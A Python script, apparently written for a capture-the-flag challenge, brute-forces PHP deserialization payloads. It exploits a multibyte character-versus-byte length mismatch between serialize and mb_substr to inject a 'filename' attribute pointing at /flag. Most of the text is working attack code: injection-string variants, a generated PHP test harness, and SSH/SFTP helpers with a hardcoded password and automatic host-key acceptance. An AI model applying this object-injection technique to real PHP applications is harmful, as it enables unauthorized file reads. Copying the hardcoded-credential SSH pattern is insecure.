"""Systematic local search for the mb char/byte offset deserialization trick.

The challenge: serialize uses strlen (bytes) for s:N, but substrstr uses
mb_strpos/mb_substr (chars) to cut between [ and ]. Multibyte chars create
a char-count vs byte-count mismatch that can make unserialize read the
injected `";s:8:"filename";s:5:"/flag";}` as real object attributes.

We brute-force over: multibyte char type, count, injection string variants,
and let PHP itself report which start value yields filename=/flag.
"""
import json
import re
import subprocess
import sys
from pathlib import Path

REMOTE_PHP = "/tmp/phpctf/probe4.php"


def build_php_runner() -> str:
    return r'''<?php
error_reporting(0);
function substrstr($data){
    $s = mb_strpos($data, "[");
    $e = mb_strpos($data, "]");
    return mb_substr($data, $s + 1, $e - 1 - $s);
}
class read_file{
    public $start;
    public $filename="/etc/passwd";
}
$start_in = file_get_contents("/tmp/phpctf/payload_start.txt");
$read_in = file_get_contents("/tmp/phpctf/payload_read.txt");
$rf = new read_file();
$rf->start = $start_in;
$data = $read_in."[".serialize($rf)."]";
$ctf = substrstr($data);
$obj = @unserialize($ctf);
echo json_encode(array(
  "ser" => serialize($rf),
  "ctf" => $ctf,
  "ok" => ($obj !== false),
  "filename" => ($obj->filename ?? null),
  "start" => ($obj->start ?? null),
), JSON_UNESCAPED_SLASHES);
?>'''


def ssh_write(cmd: str) -> str:
    """Run a remote command via paramiko, return stdout text."""
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect("192.168.157.8", username="zss", password="ss", timeout=15)
    stdin, stdout, stderr = client.exec_command(cmd, timeout=30)
    out = stdout.read().decode("utf-8", errors="replace")
    client.close()
    return out


def ssh_write_file(remote_path: str, content: str):
    import paramiko

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect("192.168.157.8", username="zss", password="ss", timeout=15)
    sftp = client.open_sftp()
    with sftp.open(remote_path, "w") as f:
        f.write(content)
    sftp.close()
    client.close()


def probe(start: str, read: str = ""):
    ssh_write_file("/tmp/phpctf/payload_start.txt", start)
    ssh_write_file("/tmp/phpctf/payload_read.txt", read)
    out = ssh_write("cd /tmp/phpctf && php probe4.php 2>&1")
    try:
        return json.loads(out)
    except Exception:
        return {"raw": out}


def main():
    runner = build_php_runner()
    ssh_write("cat > /tmp/phpctf/probe4.php <<'PHPEOF'\n" + runner + "\nPHPEOF")

    # Baseline sanity
    d = probe("gxngxngxn")
    print("baseline ok:", d.get("ok"), "filename:", d.get("filename"))
    print("baseline ser:", d.get("ser", "")[:80])

    inj_variants = [
        'gxngxngxn";s:8:"filename";s:5:"/flag";}',
        'gxngxngxn";s:8:"filename";s:5:"/flag";',
        'gxngxngxn";s:8:"filename";s:5:"/flag";}',
        'gxngxngxn";s:8:"filename";s:11:"/var/www/html/flag.txt";}',
    ]
    mb_chars = ["中", "啊", "汉", "测", "😀", "é", "€", "あ"]
    tails = ["]", "}]", "];", "]x"]
    count = 0
    found = []
    for inj in inj_variants:
        for mb in mb_chars:
            for k in range(0, 9):
                for tail in tails:
                    for pos in ["after", "before"]:
                        if pos == "after":
                            start = inj + mb * k + tail
                        else:
                            start = mb * k + inj + tail
                        count += 1
                        d = probe(start)
                        if d.get("ok") and d.get("filename") == "/flag":
                            found.append((start, d))
                            print(f"[HIT] start={start!r}")
                            print("  ctf:", d.get("ctf", "")[:150])
                        elif d.get("ok") and d.get("filename") not in (None, "/etc/passwd"):
                            found.append((start, d))
                            print(f"[DIFF-FILE] start={start[:60]!r} filename={d.get('filename')}")
    print(f"\nsearched {count} combinations, found {len(found)} hits")
    return 0


if __name__ == "__main__":
    sys.exit(main())
